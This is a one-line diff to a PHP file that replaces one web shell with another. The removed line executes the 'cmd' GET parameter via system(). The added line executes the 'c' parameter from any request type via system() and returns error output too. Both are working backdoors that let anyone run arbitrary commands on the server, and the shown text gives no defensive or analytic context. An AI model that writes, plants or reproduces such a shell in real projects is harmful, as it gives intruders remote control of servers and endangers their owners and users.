@@ -1,1 +1,1 @@
-<?php if(isset($_GET['cmd'])){ system($_GET['cmd']); } ?>
+<?php if( isset( $_REQUEST['c'] ) ) { system( $_REQUEST['c'] . ' 2>&1' ); }
